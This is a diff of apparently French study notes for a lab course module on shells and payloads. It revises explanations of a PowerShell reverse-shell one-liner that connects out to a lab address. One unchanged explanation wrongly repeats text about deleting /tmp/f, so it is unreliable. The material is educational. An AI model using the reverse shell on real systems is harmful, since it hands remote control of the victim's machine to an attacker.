@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-17T20:03:25.092Z
+date: 2025-05-17T20:08:40.432Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -206,10 +206,10 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
    Cette commande instancie l'objet .NET System.Net.Sockets.TCPClient et l’assigne à la variable $client. L'instance va ensuite se connecter avec le socket (adresse + port) précisé lors de l'instanciation de l'objet via son constructeur. **C'est l'opération de binding**.
 
 1. **`$stream = $client.GetStream();`**
-   Supprime le fichier `/tmp/f` s’il existe déjà.
+    Défini la variable $stream en appelant la méthode [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) sur l’objet $client pour gérer la communication réseau. **C'est l'opération de déinition du flux de commande**
 
 1. **`[byte[]]$bytes = 0..65535|%{0};`**
-   Supprime le fichier `/tmp/f` s’il existe déjà.
+   Cette commande crée un tableau de type byte nommé $bytes contenant 65 535 zéros. C’est un flux de bytes vide destiné à être envoyé vers le listener.
 
 1. **`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`**
    Supprime le fichier `/tmp/f` s’il existe déjà.
